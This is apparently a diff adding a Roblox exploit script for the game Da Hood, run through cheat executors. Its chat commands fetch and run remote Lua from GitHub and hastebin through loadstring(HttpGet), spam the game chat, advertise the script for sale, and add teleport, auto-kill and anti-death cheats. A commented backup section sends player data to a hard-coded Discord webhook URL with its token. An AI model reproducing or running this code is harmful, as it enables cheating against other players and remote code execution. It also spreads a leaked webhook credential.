+game.Players:Chat("L")
+game.Players:Chat("ez")
+game.Players:Chat("i tried to slow this down so u can read lol")
+while true do
+    wait(.1)
+    game.Players:Chat("if you exploit you shall not see chat.")
+    game.Players:Chat("roblox gonna warn me for spam errr")
+    wait(.1)
+    game.Players:Chat("if i get warned and u see this")
+    game.Players:Chat("then know that this is ur fault")
+    wait(.1)
+    game.Players:Chat("be ashamed of yourself bro")
+    game.Players:Chat("like just stop exploiting")
+    wait(.1)
+    game.Players:Chat("its that simple mate")
+    game.Players:Chat("if you see this say hello in chat")
+    wait(.1)
+    game.Players:Chat("if i see ur message i will say hi to u :D")
+    game.Players:Chat("im boerd of writing stuff for it to say so this is enough i guess")
+    wait(.1)
+    game.Players:Chat("gg i win")
+    game.Players:Chat("L")
+    wait(.1)
+    game.Players:Chat("ez")
+    game.Players:Chat("i tried to slow this down so u can read lol")
+end
+		elseif cht:match("/viewchat") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/spychat%20without%20resend", true))()
+        game.Players:Chat("You Can Now View Chat + Spy Messages!")
+        
+        elseif cht:match("/spychat") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/spychat", true))()
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('You Can Now View Chat + See And Retweet Spy Messages, Use "/Spy" to Disable!','all')
+        
+--Personal Information --
+
+elseif cht:match("/credits") or cht:match("/info") then
+	wait(.1)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("MadyBY: Fully Coded By TheKillerCr um (Also Known As CrumsChat, Hackram) -------------------------------------------------------------","all")
+wait(3)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Disco: TheKillerCr um 0001 -No Spaces/Do Caps","all")
+wait(4)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Info/Status: Private, No Leaks (old versions or new), For Sale! ----------------------------------------------------------","all")
+wait(4)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Extra Info:By The Way If Your Hoping For An Leak Then No, Even Better, Whistlist :) --------------------------------------------------------------------","all")
+wait(4)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Price: 10$ GiftCard, This Can Be Purchased Directly From Me Ingame. ----------------------------------------------------------------------------","all")
+wait(4)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Visible-Check: If You Can See This! This Means Your Are Speaking With ME! (thekillercr um). ---------------------------------------------------------------------------------------","all")
+wait(4)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Owners: 21 Whitelisted Users, 2 Blacklisted (Perma-Banned Off Dahood (With Or Without Executing The Script.))","all")
+wait(5)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Version: 5.6. 1 (New Updates Weekly!)","all")
+wait(5)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Executor: ScriptWare / Synapse X (Currunt Detection:'..webhookcheck..')',"all")
+wait(5)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Profit:235$ (FLEX)","all")
+
+	
+elseif cht:match("/price") then
+	wait(.1)
+     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Price: 10$ GiftCard, This Can Be Purchased Directly From Me Ingame. ----------------------------------------------------------------------------","all")
+           
+ 
+elseif cht:match("/tag") or cht:match("/dis") then
+wait(.1)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Disco: TheKillerCr um 0001 -No Spaces/Do Caps","all")
+wait(10)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Disco: TheKillerCr um 0001 -No Spaces/Do Caps","all")
+wait(10)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Disco: TheKillerCr um 0001 -No Spaces/Do Caps","all")
+wait(10)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Disco: TheKillerCr um 0001 -No Spaces/Do Caps","all")
+
+elseif cht:match("/rbx") or cht:match("/roblox") or cht:match("/username")then
+wait(.1)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Main: thekillercr um -No Spaces/No Caps","all")
+wait(10)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Main: thekillercr um -No Spaces/No Caps","all")
+wait(10)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Main: thekillercr um -No Spaces/No Caps","all")
+		
+
+
+[[--		
+elseif cht:match(";lk") then
+if wluser == nil then
+wluser = string.sub(msg, 5)
+whitelist(msg)
+		
+elseif cht:match(";unlk") then
+]]	
+		
+elseif cht:match("/current") then	
+    wait(.1)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Currently Executed: RayX, Infinite Yield, OpenGUI!","all")
+	
+		
+elseif cht:match("/load gotopos") then
+--GotoPos Before Death--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/auto%20go%20back%20to%20pos", true))()
+
+elseif cht:match("/load antistomp") then
+--Best anti stomp--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/antistomp%20lol", true))()
+
+--elseif cht:match("/unload antistomp") or cht:match("arrest me") then
+--	idk
+
+elseif cht:match("/load rbx to disco") then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/webhook%20rbolxo%20to%20discord", true))()
+
+elseif cht:match("/loadstrings") then
+	repeat wait() until game:IsLoaded()
+	wait(5)
+--------------------------------
+--AutoKill List--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/--AutoKill%20List--", true))()
+		
+--WhiteList--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/wl", true))()
+
+--KeyBinds-Tps--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/keybinds", true))()
+
+--GotoPos--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/storematelamo/store/main/gotopos%20savepos%20and%20prevpos", true))()
+
+--GotoPos Before Death--
+--loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/enaxopajub", true))()
+
+--Best anti stomp--
+--loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/exiposewob", true))()
+
+-------------------------------
+elseif cht:match("/random fix") then
+	game.Players:Chat("fix ez")
+		
+		
+		end
+	end)
+	
+																		  --Sytems--
+	
+	
+																	-- RAYX INFYIELD OPENGUI --
+game.Players:Chat("/startup")
+game.Players:Chat("/setup")
+wait(13.5)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+wait(.5)
+game.Players:Chat("/loadstrings")
+game.Players:Chat("/load gotopos")
+game.Players:Chat("/load antistomp")
+game.Players:Chat("/load rbx to disco")
+
+
+--wait(2)																       -- AutoFarm--
+--loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Arrest"), true))()
+--game.Players:Chat("/viewchat")
+
+	
+--------------------------------------------------------------PING FPS AND NOTE -------------------------------------------------------
+local PING1 = 0 
+local PINGCOUNT
+Main=Instance.new("ScreenGui",game.CoreGui)
+PING=Instance.new("TextBox",Main)
+PING.Position=UDim2.new(0.475,0,0,-15)
+PING.Size=UDim2.new(0,1,0,1)
+PING.TextColor3 = Color3.new(41,255,213)
+PING.TextColor3 = Color3.fromRGB(255, 0, 0)
+PING.BackgroundTransparency = 1
+PING.TextXAlignment = "Left"
+PING.TextYAlignment = "Top"
+PING.TextSize = 12
+PING.Text = "Ping: "
+spawn(function() game:GetService("RunService").Heartbeat:Connect(function()
+    PING1 = PING1+1
+end)end)
+spawn(function() while wait(1) do
+    PINGCOUNT = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("[^.]+")
+    PING1 = 0 
+    PING.Text = (" Ping: " .. PINGCOUNT)
+end end)
+
+local NOTE1 = 0 
+local NOTECOUNT
+Main=Instance.new("ScreenGui",game.CoreGui)
+NOTE=Instance.new("TextBox",Main)
+NOTE.Position=UDim2.new(0.31,0,0,-30)
+NOTE.Size=UDim2.new(0,1,0,1)
+NOTE.TextColor3 = Color3.new(41,255,213)
+NOTE.TextColor3 = Color3.fromRGB(255, 0, 0)
+NOTE.BackgroundTransparency = 1
+NOTE.TextXAlignment = "Left"
+NOTE.TextYAlignment = "Top"
+NOTE.TextSize = 12
+NOTE.Text = "Note:GodMode V2 (RayX) Will Kick You If Ping Is Bellow 500 When Executed."
+
+
+local FPS1 = 0 
+local FPSCOUNT
+Main=Instance.new("ScreenGui",game.CoreGui)
+FPS=Instance.new("TextBox",Main)
+FPS.Position=UDim2.new(0.475,0,0,5)
+FPS.Size=UDim2.new(0,1,0,1)
+FPS.TextColor3 = Color3.new(41,255,213)
+FPS.TextColor3 = Color3.fromRGB(255, 0, 0)
+FPS.BackgroundTransparency = 1
+FPS.TextXAlignment = "Left"
+FPS.TextYAlignment = "Top"
+FPS.TextSize = 12
+FPS.Text = "0"
+spawn(function() game:GetService("RunService").Heartbeat:Connect(function()
+FPS1 = FPS1+1
+end)end)
+spawn(function() while wait(1) do
+FPSCOUNT = tostring(FPS1)
+FPS1 = 0 
+FPS.Text = (" FPS: " .. FPSCOUNT)
+end end)
+
+
+
+
+
+
+--------------------------------------------------------------Scripts-------------------------------------------------------
+
+
+--Best anti stomp--
+--loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/exiposewob", true))()
+
+
+local player = game:service'Players'.LocalPlayer
+local function respawn()
+local character = player.Character
+death = character.HumanoidRootPart.Position
+character:FindFirstChild("Humanoid"):Destroy() 
+for i, v in pairs(character:GetChildren()) do 
+    if v:IsA("BasePart") or v:IsA("Accessory") then 
+        v:Destroy() 
+    end 
+end
+wait(8)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(death)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Returned To Pos!", "All")
+
+end
+local function start_change()
+local character = player.Character
+repeat wait(1) until not character or character:FindFirstChildOfClass'Humanoid'
+if character then
+    local humanoid = character:FindFirstChildOfClass'Humanoid'
+    humanoid:GetPropertyChangedSignal('Health'):Connect(function()
+        if humanoid.Health < 1 then
+            respawn()
+        end
+    end)
+end
+end
+local character = player.Character or Player.CharacterAdded:Wait()
+start_change(character)
+player.CharacterAdded:Connect(start_change)
+
+--------------------------------------------------------------Scripts-------------------------------------------------------
+
+--GotoPos Before Death--
+--loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/enaxopajub", true))()
+
+
+local Player = game.Players.LocalPlayer
+local plrs = game:GetService('Players')
+local lp = plrs.LocalPlayer
+function onDamage(hum)
+    hum:GetPropertyChangedSignal('Health'):Connect(function()
+	death = game.Players.LocalPlayer.Character.HumanoidRootPart.Position	
+    end)
+end
+lp.CharacterAdded:Connect(function(char)
+    local hum = char:WaitForChild('Humanoid', 3)
+    if hum then
+        onDamage(hum)
+    end
+end)
+pcall(function()
+    onDamage(lp.Character.Humanoid)
+end)
+		
+Player.Chatted:connect(function(cht)
+    if cht:match("/lastpos") or cht:match("/prevpos") then
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(death)
+			end
+	end)
+
+
+
+--[[
+--ALL LOADSTRINGS SAVED HERE AS A BACKUP
+--------------------------1---------------------------return to pos
+
+local player = game:service'Players'.LocalPlayer
+local function respawn()
+local character = player.Character
+death = character.HumanoidRootPart.Position
+character:FindFirstChild("Humanoid"):Destroy() 
+for i, v in pairs(character:GetChildren()) do 
+    if v:IsA("BasePart") or v:IsA("Accessory") then 
+        v:Destroy() 
+    end 
+end
+wait(7)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(death)
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Returned To Pos!", "All")
+
+end
+local function start_change()
+local character = player.Character
+repeat wait(1) until not character or character:FindFirstChildOfClass'Humanoid'
+if character then
+    local humanoid = character:FindFirstChildOfClass'Humanoid'
+    humanoid:GetPropertyChangedSignal('Health'):Connect(function()
+        if humanoid.Health < 1 then
+            respawn()
+        end
+    end)
+end
+end
+local character = player.Character or Player.CharacterAdded:Wait()
+start_change(character)
+player.CharacterAdded:Connect(start_change)
+--------------------------2---------------------------lastpos
+
+local Player = game.Players.LocalPlayer
+local plrs = game:GetService('Players')
+local lp = plrs.LocalPlayer
+function onDamage(hum)
+    hum:GetPropertyChangedSignal('Health'):Connect(function()
+	death = game.Players.LocalPlayer.Character.HumanoidRootPart.Position	
+    end)
+end
+lp.CharacterAdded:Connect(function(char)
+    local hum = char:WaitForChild('Humanoid', 3)
+    if hum then
+        onDamage(hum)
+    end
+end)
+pcall(function()
+    onDamage(lp.Character.Humanoid)
+end)
+		
+Player.Chatted:connect(function(cht)
+    if cht:match("/lastpos") or cht:match("/prevpos) then
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(death)
+			end
+	end)
+
+--------------------------3---------------------------whitelist
+
+
+game.Players.LocalPlayer.Chatted:connect(function(msg)
+time = string.sub(msg, 9)
+
+
+local wlholder = {}
+
+local function whitelist(msg)
+for i,v in pairs(game.Players:GetPlayers()) do 
+if v.Name:lower():sub(1,#wluser) == wluser:lower() then
+wluser = v.Name
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(wluser .. " Has Been Added From The AutoKill List, Loading...", "All")
+wait(1)
+if not table.find(wlholder, v.Name) then
+table.insert(wlholder, v.Name)
+wait(1)
+v.Chatted:connect(function(msg)
+if v.Name == wluser then
+
+
+end -- username check
+end) -- message function
+end -- table
+end -- get entire user
+end -- get players
+end -- functions
+
+
+ if string.sub(msg, 1, 3) == "/wl" then
+  if wluser == nil then
+   wluser = string.sub(msg, 5)
+   whitelist(msg)
+  end
+end
+ 
+ if string.sub(msg, 1, 6) == "ttestt" then
+  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah im still responsive! (wl)", "All")
+  end
+
+
+ if string.sub(msg, 1, 5) == "/unwl" then
+  if wluser ~= nil then
+   game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(wluser .. " Has Been Removed From The AutoKill List!", "All")
+   wluser = nil
+  end
+ end
+end)
+--------------------------4---------------------------loopkill
+
+game.Players.LocalPlayer.Chatted:connect(function(msg)
+time = string.sub(msg, 9)
+
+local wlholder = {}
+
+local function whitelist(msg)
+for i,v in pairs(game.Players:GetPlayers()) do 
+if v.Name:lower():sub(1,#wluser) == wluser:lower() then
+wluser = v.Name
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(wluser .. " Has Been Added From The  Whitelist, Loading... ----------------------------------------------------", "All")
+wait(1)
+if not table.find(wlholder, v.Name) then
+table.insert(wlholder, v.Name)
+wait(1)
+v.Chatted:connect(function(msg)
+if v.Name == wluser then
+
+
+end -- username check
+end) -- message function
+end -- table
+end -- get entire user
+end -- get players
+end -- functions
+
+
+ if string.sub(msg, 1, 3) == "/wl" then
+  if wluser == nil then
+   wluser = string.sub(msg, 5)
+   whitelist(msg)
+  end
+end
+ 
+ if string.sub(msg, 1, 6) == "ttestt" then
+  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah im still responsive! (lp)", "All")
+  end
+
+
+ if string.sub(msg, 1, 5) == "/unwl" then
+  if wluser ~= nil then
+   game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(wluser .. " Has Been Removed From The Whitelist! ----------------------------------------------------", "All")
+   wluser = nil
+  end
+ end
+end)
+-------------------------5-------------------------keybinds
+
+
+
+lp = game.Players.LocalPlayer
+ms = lp:GetMouse() 
+ms.KeyDown:connect(function(key) 
+
+-- Hot Keys
+
+--if check1 == 0 then
+
+if key == "h" then 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-402, 22, -284)
+
+elseif key == "q" then 
+game.Players:Chat("/unfling")
+
+elseif key == "t" then 
+    game.Players:Chat("/admin1")
+elseif key == "u" then 
+    game.Players:Chat("/admin2")
+elseif key == "i" then
+    game.Players:Chat("/armor")
+elseif key == "o" then
+    game.Players:Chat("/unadmin1")
+elseif key == "z" then
+    game.Players:Chat("/dumpster")
+elseif key == "x" then
+    game.Players:Chat("/death1")
+elseif key == "c" then
+    game.Players:Chat("/death2")
+elseif key == "b" then
+    game.Players:Chat("/trap1")
+elseif key == "n" then
+    game.Players:Chat("/random")
+elseif key == "m" then
+    game.Players:Chat("/cliff")
+elseif key == "," then
+    game.Players:Chat("/trap2")
+elseif key == "j" then
+    game.Players:Chat("/pvp")
+
+
+
+
+
+end
+end)
+
+
+--------------------------6---------------------------gotopos/prevpos/savepos
+
+local Player = game.Players.LocalPlayer
+local Pos, PrevPos
+Player.Chatted:connect(function(cht)
+if cht:match("/savepos") then
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Saved!", "all")
+    Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+elseif cht:match("/prevpos") then 
+    if PrevPos ~= nil then 
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(PrevPos)
+    else
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You Must Save A Position First!!", "all")
+    end
+elseif cht:match("/gotopos") then
+    PrevPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    if Pos ~= nil then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Teleported!", "all")
+    else
+        
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You Must Save A Position First!!", "all")
+    end
+end
+end)
+
+
+--------------------------7---------------------------send messages from roblox to discord
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or  getexecutorname() and "Scriptware"
+local url = "https://discord.com/api/webhooks/931742812985229322/gkvGkILBnUAxagl90O6VAuDyc5evlS3WciRVZJ27slGCQ3mXuCkFzQXvpKL6vZydBwrh"
+
+local Players = game:GetService("Players")
+Players.LocalPlayer.Chatted:Connect(function(msg)
+local args = msg:split(" ")
+if args[1]:lower() == "/send" then
+table.remove(args, 1)
+--Players:Chat(table.concat(args, " "))
+
+
+local data = { 
+["avatar_url"] = "https://cdn.discordapp.com/avatars/479024866838839307/b1909210f3e674782621e80d8692732c.png?size=4096",
+["username"] = "TheKillerCrum",
+["content"] = "Somthing Has Been Logged!?",
+
+["embeds"] = {
+    {
+        ["title"] = "**"..game.Players.LocalPlayer.Name.." Is Trying To Send A Message!**",
+        ["description"] = "\n Join Code:\n https://roblox.com/discover#/rg-join/"..game.PlaceId.."/"..game.JobId.." \n \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."\n**Message:**"..(table.concat(args, " ")).."** \n \n Avater:",
+        ["type"] = "rich",
+        ["color"] = tonumber(0x7269da),
+        ["image"] = {
+            ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                tostring(game:GetService("Players").LocalPlayer.Name)
+        }
+    
+    }
+}
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+end
+end)
+]]
+
